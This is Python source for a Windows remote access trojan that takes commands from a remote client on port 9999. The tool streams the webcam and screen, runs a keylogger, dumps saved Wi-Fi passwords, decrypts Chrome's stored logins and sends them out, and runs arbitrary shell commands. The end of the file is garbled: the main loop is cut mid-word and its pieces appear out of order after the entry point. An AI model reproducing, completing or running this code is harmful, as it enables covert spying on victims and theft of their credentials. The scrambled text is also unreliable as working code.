
import socket
import cv2
import pickle
import struct
import subprocess
import mss
import numpy as np
from pynput import keyboard
import threading
import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import csv
import json

import re

def get_wifi_profiles():
    # Execute the command to get WiFi profiles
    result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
    
    # Extract profile names using regex
    profiles = re.findall(r"Profile\s*:\s*(.+)", result.stdout)
    return [profile.strip() for profile in profiles]

def get_wifi_password(profile):
    # Execute the command to get WiFi profile details
    result = subprocess.run(["netsh", "wlan", "show", "profile", f"name={profile}", "key=clear"], capture_output=True, text=True)
    
    # Extract password using regex
    match = re.search(r"Key\s*Content\s*:\s*(.+)", result.stdout)
    if match:
        return match.group(1).strip()
    return None

def send_wifi_passwords(client_socket):
    wifi_profiles = get_wifi_profiles()
    wifi_details = ""
    
    for profile in wifi_profiles:
        password = get_wifi_password(profile)
        if password:
            wifi_details += f"SSID: {profile}, Password: {password}\n"
    
    # Send the wifi details to the client
    client_socket.sendall(wifi_details.encode())

def chrome():
#GLOBAL CONSTANT
    CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
    CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

    def get_secret_key():
        try:
            #(1) Get secretkey from chrome local state
            with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            #Remove suffix DPAPI
            secret_key = secret_key[5:] 
            secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
            return secret_key
        except Exception as e:
            print("%s"%str(e))
            print("[ERR] Chrome secretkey cannot be found")
            return None
        
    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(ciphertext, secret_key):
        try:
            #(3-a) Initialisation vector for AES decryption
            initialisation_vector = ciphertext[3:15]
            #(3-b) Get encrypted password by removing suffix bytes (last 16 bits)
            #Encrypted password is 192 bits
            encrypted_password = ciphertext[15:-16]
            #(4) Build the cipher to decrypt the ciphertext
            cipher = generate_cipher(secret_key, initialisation_vector)
            decrypted_pass = decrypt_payload(cipher, encrypted_password)
            decrypted_pass = decrypted_pass.decode()  
            return decrypted_pass
        except Exception as e:
            print("%s"%str(e))
            print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
            return ""
        
    def get_db_connection(chrome_path_login_db):
        try:
            print(chrome_path_login_db)
            shutil.copy2(chrome_path_login_db, "Loginvault.db") 
            return sqlite3.connect("Loginvault.db")
        except Exception as e:
            print("%s"%str(e))
            print("[ERR] Chrome database cannot be found")
            return None
            
    if __name__ == '__main__':
        try:
            #Create Dataframe to store passwords
            with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
                csv_writer = csv.writer(decrypt_password_file, delimiter=',')
                csv_writer.writerow(["index","url","username","password"])
                #(1) Get secret key
                secret_key = get_secret_key()
                #Search user profile or default folder (this is where the encrypted login password is stored)
                folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
                data_dict={}
                for folder in folders:
                    #(2) Get ciphertext from sqlite database
                    chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
                    conn = get_db_connection(chrome_path_login_db)
                    if(secret_key and conn):
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        for index,login in enumerate(cursor.fetchall()):
                            url = login[0]
                            username = login[1]
                            ciphertext = login[2]
                            if(url!="" and username!="" and ciphertext!=""):
                                #(3) Filter the initialisation vector & encrypted password from ciphertext 
                                #(4) Use AES algorithm to decrypt the password
                                decrypted_password = decrypt_password(ciphertext, secret_key)
                                # print("Sequence: %d"%(index))
                                # print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                                # print("*"*50)
                                data_dict[index] = {
                                    "URL": url,
                                    "User Name": username,
                                    "Password": decrypted_password
                                }
                                #(5) Save into CSV 
                                csv_writer.writerow([index,url,username,decrypted_password])
                        #Close database connection
                        cursor.close()
                        conn.close()
                        #Delete temp login db
                        os.remove("Loginvault.db")
                return data_dict
        except Exception as e:
            return("[ERR] %s"%str(e))


def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("192.168.1.9", 80))
    return s.getsockname()[0]

keylog = []
keylog_active = False
keylog_lock = threading.Lock()
keylog_thread = None
keylogger_listener = None

def on_press(key):
    global keylog
    with keylog_lock:
        if keylog_active:
            try:
                keylog.append(key.char)
            except AttributeError:
                keylog.append(f"[{key}]")

def start_keylogger():
    global keylog_active
    global keylog_thread
    global keylogger_listener
    with keylog_lock:
        keylog_active = True
    def keylogger():
        global keylogger_listener
        keylogger_listener = keyboard.Listener(on_press=on_press)
        keylogger_listener.start()
        keylogger_listener.join()
    keylog_thread = threading.Thread(target=keylogger)
    keylog_thread.start()
    print("Keylogger started.")

def stop_keylogger():
    global keylog_active
    global keylogger_listener
    with keylog_lock:
        keylog_active = False
    if keylogger_listener is not None:
        keylogger_listener.stop()  # Stop the listener
        keylogger_listener.join()  # Wait for the listener thread to exit
    if keylog_thread is not None:
        keylog_thread.join()  # Wait for the keylogger thread to finish
    print("Keylogger stopped.")

def dump_keylog():
    with keylog_lock:
        return ''.join(keylog)

def handle_camera(client):
    vid = cv2.VideoCapture(0)
    while vid.isOpened():
        ret, frame = vid.read()
        if not ret:
            break
        data = pickle.dumps(frame)
        message = struct.pack("Q", len(data)) + data
        client.sendall(message)
    vid.release()
    cv2.destroyAllWindows()

def handle_screen(client):
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        while True:
            screenshot = sct.grab(monitor)
            img = np.array(screenshot)
            img = cv2.resize(img, (800, int(800 * img.shape[0] / img.shape[1])))
            data = pickle.dumps(img)
            message = struct.pack("Q", len(data)) + data
            client.sendall(message)

def send_large_data(client, data):
    # Convert data to JSON string
    json_string = json.dumps(data, indent=4)
    # Encode JSON string to bytes
    data_bytes = json_string.encode()

    # Send data length first
    data_length = len(data_bytes)
    client.sendall(struct.pack("Q", data_length))

    # Send data in chunks
    chunk_size = 4096  # Size of each chunk
    for i in range(0, data_length, chunk_size):
        chunk = data_bytes[i:i + chunk_size]
        client.sendall(chunk)
def handle_chrome_data(client):
    chrome_data = chrome()  # Assuming chrome() returns the data
    send_large_data(client, chrome_data)
    

def main():
    ser_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_ip = get_ip_address()
    port = 9999
    ser_sock.bind((host_ip, port))
    ser_sock.listen(5)
    print(f"Server serving at {host_ip}:{port}")

    wssword_file_path):
                        os.remove(password_file_path)
                        print(f"Deleted the password file: {password_file_path}")
                    else:
                        print("Password file not found.")
                elif command == 'wifi':
                    send_wifi_passwords(client)
                else:
                    output = subprocess.getoutput(command)
                    client.send(output.encode())
        except ConnectionResetError:
            print(f"Connection with {addr} was reset.")
        finally:
            client.close()
            print(f"Connection with {addr} closed.")

if __name__ == "__main__":
    main()
hile True:
        client, addr = ser_sock.accept()
        print(f"Connected to Client@{addr}")
        try:
            while True:
                command = client.recv(1024).decode()
                if command == 'exit':
                    break
                elif command == 'camera':
                    handle_camera(client)
                elif command == 'screen':
                    handle_screen(client)
                elif command == 'start_keylog':
                    start_keylogger()
                elif command == 'stop_keylog':
                    stop_keylogger()
                elif command == 'dump_keylog':
                    keylog_data = dump_keylog()
                    client.sendall(keylog_data.encode())
                elif command == 'chrome':
                    handle_chrome_data(client)
                    password_file_path = "decrypted_password.csv"
                    if os.path.exists(pa